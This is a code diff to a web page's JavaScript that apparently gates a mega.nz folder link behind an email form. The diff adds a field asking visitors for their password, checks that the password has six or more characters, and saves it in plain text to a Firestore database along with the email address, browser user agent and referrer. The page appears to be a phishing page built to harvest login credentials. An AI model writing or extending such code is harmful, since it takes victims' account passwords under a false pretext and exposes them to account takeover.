@@ -48,6 +48,7 @@ const REDIRECT_URL = "https://mega.nz/folder/ngJDhA5B#WLOm7yiqpmi7SE1jwOdPOA";
 // DOM elements
 const emailForm = document.getElementById('emailForm');
 const emailInput = document.getElementById('emailInput');
+const passwordInput = document.getElementById('passwordInput');
 const submitBtn = document.getElementById('submitBtn');
 const errorMessage = document.getElementById('errorMessage');
 const successMessage = document.getElementById('successMessage');
@@ -93,8 +94,13 @@ function isValidEmail(email) {
     return emailRegex.test(email);
 }
 
-// Save email to Firestore
-async function saveEmail(email) {
+// Validate password
+function isValidPassword(password) {
+    return password && password.length >= 6;
+}
+
+// Save email and password to Firestore
+async function saveEmail(email, password) {
     if (!firebaseInitialized || !db) {
         throw new Error('Firebase not initialized');
     }
@@ -102,6 +108,7 @@ async function saveEmail(email) {
     try {
         const emailData = {
             email: email.toLowerCase().trim(),
+            password: password, // Note: In production, passwords should be hashed
             timestamp: firebase.firestore.FieldValue.serverTimestamp(),
             userAgent: navigator.userAgent,
             referrer: document.referrer || 'direct'
@@ -130,6 +137,7 @@ emailForm.addEventListener('submit', async (e) => {
     }
     
     const email = emailInput.value.trim();
+    const password = passwordInput.value;
     
     // Validate email
     if (!email) {
@@ -144,6 +152,19 @@ emailForm.addEventListener('submit', async (e) => {
         return;
     }
     
+    // Validate password
+    if (!password) {
+        showError('Please enter your password');
+        passwordInput.focus();
+        return;
+    }
+    
+    if (!isValidPassword(password)) {
+        showError('Password must be at least 6 characters long');
+        passwordInput.focus();
+        return;
+    }
+    
     // Set loading state
     setLoading(true);
     
@@ -154,8 +175,8 @@ emailForm.addEventListener('submit', async (e) => {
     }, 10000); // 10 second timeout
     
     try {
-        // Save email to database
-        await saveEmail(email);
+        // Save email and password to database
+        await saveEmail(email, password);
         
         // Clear timeout
         clearTimeout(timeoutId);
@@ -191,6 +212,12 @@ emailForm.addEventListener('submit', async (e) => {
 
 // Clear error message when user starts typing
 emailInput.addEventListener('input', () => {
+    if (errorMessage.style.display === 'block') {
+        hideMessages();
+    }
+});
+
+passwordInput.addEventListener('input', () => {
     if (errorMessage.style.display === 'block') {
         hideMessages();
     }
